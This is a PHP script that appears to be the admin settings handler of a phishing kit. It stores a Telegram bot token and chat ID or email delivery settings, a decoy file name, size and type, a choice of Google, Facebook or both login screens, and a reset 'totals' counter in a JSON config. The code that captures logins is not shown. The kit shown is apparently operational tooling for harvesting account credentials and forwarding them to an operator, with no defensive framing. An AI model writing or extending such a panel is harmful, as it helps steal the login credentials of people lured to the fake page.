<?php
session_start();
if (!isset($_SESSION['host_authenticated']) || $_SESSION['host_authenticated'] !== true) {
    http_response_code(403);
    die("Forbidden");
}

if (isset($_POST['nama'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['nama'] = $_POST['nama'];
    $config['totals'] = 0;
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['send_method'])) {
    $allowed = ['telegram', 'email'];
    $method = strtolower(trim($_POST['send_method']));
    if (in_array($method, $allowed, true)) {
        $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
        $config['send_method'] = $method;
        file_put_contents('../jetetc/datanya.json', json_encode($config));
        echo "Sukses";
    } else {
        http_response_code(400);
        echo "Metode tidak valid";
    }
}
if (isset($_POST['email_to'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['email_to'] = $_POST['email_to'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['email_subject'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['email_subject'] = $_POST['email_subject'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['email_from_name'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['email_from_name'] = $_POST['email_from_name'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['email_from_address'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['email_from_address'] = $_POST['email_from_address'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['tokenbot'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['tokenbot'] = $_POST['tokenbot'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['userid'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['userid'] = $_POST['userid'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['namafile'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['namafile'] = $_POST['namafile'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['ukuran'])) {
    $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
    $config['ukuran'] = $_POST['ukuran'];
    file_put_contents('../jetetc/datanya.json', json_encode($config));
    echo "Sukses";
}
if (isset($_POST['jenisfile'])) {
    $allowed = ['jpg', 'zip', 'mp4'];
    $jenis = strtolower(trim($_POST['jenisfile']));
    if (in_array($jenis, $allowed, true)) {
        $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
        $config['jenisfile'] = $jenis;
        file_put_contents('../jetetc/datanya.json', json_encode($config));
        echo "Sukses";
    } else {
        http_response_code(400);
        echo "Jenis file tidak valid";
    }
}
if (isset($_POST['login_mode'])) {
    $allowed = ['google', 'facebook', 'both'];
    $mode = strtolower(trim($_POST['login_mode']));
    if (in_array($mode, $allowed, true)) {
        $config = json_decode(file_get_contents('../jetetc/datanya.json'), true);
        $config['login_mode'] = $mode;
        file_put_contents('../jetetc/datanya.json', json_encode($config));
        echo "Sukses";
    } else {
        http_response_code(400);
        echo "Mode tidak valid";
    }
}
?>

